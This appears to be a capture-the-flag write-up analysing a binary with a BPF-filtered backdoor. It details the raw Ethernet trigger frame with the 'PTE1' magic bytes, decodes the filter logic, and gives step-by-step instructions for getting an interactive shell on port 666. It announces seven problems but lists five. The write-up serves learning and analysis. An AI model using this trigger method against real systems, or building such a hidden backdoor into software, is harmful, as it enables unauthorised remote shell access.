# baby-passes-filters — Trigger Analysis

## Why the Original Script Fails

The original script has **7 distinct problems** that prevent it from ever triggering the backdoor.

---

### Problem 1 — Wrong Socket Type (Fatal)

```python
# WRONG
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
```

`AF_INET` raw sockets operate at the IP layer. The kernel handles Ethernet framing internally and your packet is never visible as a complete Ethernet frame on the wire. The backdoor's BPF filter is attached to an `AF_PACKET` socket which reads *raw Ethernet frames* — it sees **EtherType at byte 12**, **IP at byte 14**, and **TCP at byte 34**. A packet sent via `AF_INET` does not produce the Ethernet frame layout the BPF expects.

**Fix:** Use `AF_PACKET, SOCK_RAW` and build the full Ethernet frame manually.

---

### Problem 2 — Ethernet Padding Is Ignored (Fatal)

```python
eth_pad = b"\x00" * 12 + b"\x08\x00"   # manually prepended
s.sendto(packet, ("127.0.0.1", 0))      # sent via AF_INET
```

`AF_INET` sendto ignores any bytes you prepend — the kernel writes its own Layer 2 header. The BPF filter checking `[0x0c] == 0x0800` will never see your manually crafted `eth_pad`.

---

### Problem 3 — No PTE1 Magic Bytes (Fatal)

```python
packet = eth_pad + ip_head + tcp_head + b"A"*20
```

The 118-instruction BPF filter checks the TCP payload for the magic bytes `50 54 45 31` ("PTE1") at the correct offset. `b"A"*20` = `0x41` repeated — it will never match. The filter drops the packet silently.

---

### Problem 4 — Prerequisite Steps Missing (Fatal)

The binary is a **state machine** with two prerequisites before the trigger packet has any effect:

1. **TCP connection on port 666** — The `accept()` loop registers your fd in an internal linked-list (`DAT_00104cb8`). The fork loop iterates this list to find a fd for the shell. An empty list = no shell.

2. **Flush to advance BPF state** — The service starts with a dummy 1-instruction BPF (`RET #0` = drop everything). It sits in:
   ```c
   do { recv(..., MSG_DONTWAIT); } while (errno != EAGAIN);
   ```
   Only after this loop exits does it install the real 118-instruction filter. You must trigger `EAGAIN` (errno=11) first.

---

### Problem 5 — Drain Loop Race Condition

After the trigger, the grandchild process runs:
```c
do { read(*fd, buf, 0x200); } while (read > 0);
```
Any commands sent immediately after the trigger are **read and discarded**. You must wait ~1–2 seconds before sending shell input.

---

## Valid Trigger Packet — Memory Layout

```
Byte    Hex    Field              Constraint
──────────────────────────────────────────────────────────────────────
ETHERNET HEADER (14 bytes)
0x00    ff ff ff ff ff ff   DST MAC      any (loopback ignores MAC)
0x06    00 00 00 00 00 00   SRC MAC      any
0x0c    08 00               EtherType    ★ MUST be 0x0800 (IPv4)
                                           BPF: LDH[12] JEQ #0x800

IPv4 HEADER (20 bytes, starts at byte 14 = 0x0e)
0x0e    45                  Ver+IHL      ★ IHL=5 → 20-byte header
                                           BPF uses: LDX 4*([0x0e]&0xf)
0x0f    00                  DSCP/ECN     any
0x10    00 3e               Total Len    ip+tcp+payload (no eth)
0x12    00 01               IP ID        any
0x14    40 00               Flags+Frag   DF set
0x16    40                  TTL          64
0x17    06                  Protocol     ★ MUST be 0x06 (TCP)
                                           BPF: LDB[0x17] JEQ #6
0x18    xx xx               IP Checksum  computed (RFC 1071)
0x1a    7f 00 00 01         Src IP       127.0.0.1
0x1e    7f 00 00 01         Dst IP       127.0.0.1

TCP HEADER (20 bytes, starts at byte 34 = 0x22)
(BPF register X = 20 after LDX 4*([0x0e]&0xf) with IHL=5)
0x22    12 34               Src Port     any
0x24    02 9a               Dst Port     ★ MUST be 666 (0x029a)
                                           BPF: LDH[X+0x10] JEQ #0x29a
                                           (X=20, 20+0x10=36=0x24 ✓)
0x26    00 00 00 01         Seq          any
0x2a    00 00 00 00         Ack          any
0x2e    50                  Data Offset  ★ upper nibble=5 → 20-byte hdr
                                           BPF: LDB[X+0x1a]
                                           (X=20, 20+0x1a=46=0x2e ✓)
0x2f    02                  Flags        SYN (any works)
0x30    16 d0               Window       5840
0x32    xx xx               TCP Checksum computed
0x34    00 00               Urgent       0

TCP PAYLOAD (starts at byte 54 = 0x36)
0x36    50 54 45 31         "PTE1"       ★ MAGIC BYTES required by BPF
0x3a    00 00 00 00 ...     Padding      anything

Total frame: 66 bytes
```

---

## BPF Filter Logic — Partial Decode

The 118-instruction filter at `DAT_00104100` implements this check sequence (from the visible bytecode in the dump):

```
[1]  LDH  [0x0c]           ; A = EtherType
[2]  JEQ  #0x0800 → pass   ; IPv4? else DROP

[3]  LDB  [0x17]           ; A = IP.Protocol
[4]  JEQ  #0x06   → pass   ; TCP? else DROP

[5]  LDX  4*([0x0e]&0xf)   ; X = IP header length in bytes
[6]  LDH  [X+0x10]         ; A = TCP dest port (at eth[14]+X+16)
[7]  JEQ  #0x029a → pass   ; port 666? else DROP

[8]  LDB  [X+0x1a]         ; A = TCP data-offset byte
     ... compute payload offset ...
[?]  LDW  [payload+0]      ; A = first 4 bytes of TCP payload
[?]  JEQ  #0x50544531      ; "PTE1"? else DROP
     RET  #0xffff          ; PASS (non-zero = allow packet)
```

---

## Correct Execution Order

```
Step 1  tcp_sock = connect(TARGET_IP, 666)
        → Your fd is now in DAT_00104cb8 linked list

Step 2  tcp_sock.send(b"\x00")  +  sleep(0.5)
        → Drains recv loop → errno=EAGAIN=11 → binary attaches
          the real 118-instruction BPF filter

Step 3  raw_sock = AF_PACKET, SOCK_RAW
        raw_sock.send(build_trigger_packet())
        → BPF passes packet → C code bounds-checks IHL/TCP offset
          → fork() → fork() → grandchild runs drain loop → execve("/bin/sh")

Step 4  sleep(2.0)
        → Grandchild drain loop finishes → shell is ready

Step 5  Interactive I/O on tcp_sock
        → stdin/stdout/stderr are dup2'd to your TCP fd
```

---

## Notes on the "PTE1" String

The string `PTE1` found by `strings` in the binary is **not** a pre-defined magic constant — it's a coincidental pattern in the `_start` function prologue:

```
001011ad:  50        PUSH RAX
001011ae:  54        PUSH RSP
001011af:  45 31 c0  XOR R8D, R8D
```

The bytes `50 54 45 31` spell "PTE1" in ASCII. The BPF filter at `DAT_00104100` was crafted to search for exactly these bytes in the TCP payload — a clever choice because they look like normal x86-64 prologue instructions and would be easy to miss.
